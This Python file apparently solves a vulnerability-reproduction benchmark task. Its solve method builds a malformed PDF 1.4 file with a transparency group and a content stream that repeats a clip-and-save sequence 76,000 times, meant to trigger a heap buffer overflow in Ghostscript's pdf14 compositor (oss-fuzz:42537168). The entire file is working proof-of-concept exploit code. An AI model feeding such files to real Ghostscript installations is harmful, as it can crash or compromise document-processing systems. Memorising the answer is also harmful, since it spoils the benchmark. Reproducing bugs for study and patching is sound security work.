import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in Ghostscript.
        The vulnerability (oss-fuzz:42537168) is due to unchecked nesting depth in the 
        layer/clip stack within the pdf14 device (transparency compositor).
        
        The PoC creates a PDF 1.4 file with a page using a Transparency Group, and 
        a content stream that repeatedly modifies the clip path and saves the graphics state ('q'),
        causing the clip stack to grow beyond bounds.
        """
        
        # Number of iterations chosen to match the ground-truth PoC size (~913KB)
        # and ensure the stack depth exceeds likely buffer limits.
        # Payload per iteration: "0 0 m W n q\n" (12 bytes)
        # 76000 * 12 = 912,000 bytes
        iterations = 76000
        
        # PDF Header
        header = b"%PDF-1.4\n"
        
        # Object 1: Catalog
        obj1 = (
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R >>\n"
            b"endobj\n"
        )
        
        # Object 2: Pages
        obj2 = (
            b"2 0 obj\n"
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            b"endobj\n"
        )
        
        # Object 3: Page with Transparency Group
        # The Group dictionary is essential to activate the pdf14 compositor device.
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] "
            b"/Group << /S /Transparency /CS /DeviceRGB /I true >> "
            b"/Contents 4 0 R >>\n"
            b"endobj\n"
        )
        
        # Payload construction
        # Operations:
        # 0 0 m : Move to 0,0 (start path)
        # W     : Clip to current path
        # n     : End path (no stroke/fill)
        # q     : Save graphics state (pushes to stack)
        payload_chunk = b"0 0 m W n q\n"
        stream_content = payload_chunk * iterations
        
        # Object 4: Content Stream
        obj4_start = b"4 0 obj\n<< /Length " + str(len(stream_content)).encode() + b" >>\nstream\n"
        obj4_end = b"\nendstream\nendobj\n"
        obj4 = obj4_start + stream_content + obj4_end
        
        # Assemble body and calculate offsets for XREF
        objects = [obj1, obj2, obj3, obj4]
        body = header
        offsets = []
        current_pos = len(header)
        
        for obj in objects:
            offsets.append(current_pos)
            body += obj
            current_pos += len(obj)
            
        # XREF Table
        xref_start = len(body)
        xref = b"xref\n0 5\n0000000000 65535 f \n"
        for off in offsets:
            xref += b"%010d 00000 n \n" % off
            
        # Trailer
        trailer = (
            b"trailer\n"
            b"<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n"
            b"%d\n"
            b"%%EOF\n"
        ) % xref_start
        
        return body + xref + trailer
